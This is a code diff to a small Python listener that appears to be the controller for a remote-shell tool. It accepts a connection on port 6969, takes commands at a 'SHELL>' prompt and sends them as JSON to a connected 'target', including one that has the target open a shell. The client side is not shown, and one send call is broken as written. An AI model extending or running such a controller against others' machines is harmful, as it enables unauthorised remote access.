@@ -1,12 +1,23 @@
 import socket
+import json
 
 HOST = "127.0.0.1" # Address to listen on
 PORT = 6969 # Port to listen on. (Better to use unprivileged ports)
 
+def send_command(conn, *args):
+    """Send a command to the target"""
+    conn.send(json.dumps(args))
 
-def shell(): 
+def wait_response(conn):
+    """Gets a response from the target"""
+    data = conn.recv(1024)
+    return data
+
+def shell(conn): 
     """Actions performed when the shell command is typed"""
     print("[INFO] Dropping into a shell...")
+    send_command(conn, "shell")
+    
 
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
@@ -20,6 +31,6 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             command = input("SHELL> ") # Request user command input
             match command: # Parse user command input
                 case 'shell':
-                    shell()
+                    shell(conn)
             data = conn.recv(1024)
             print(data)
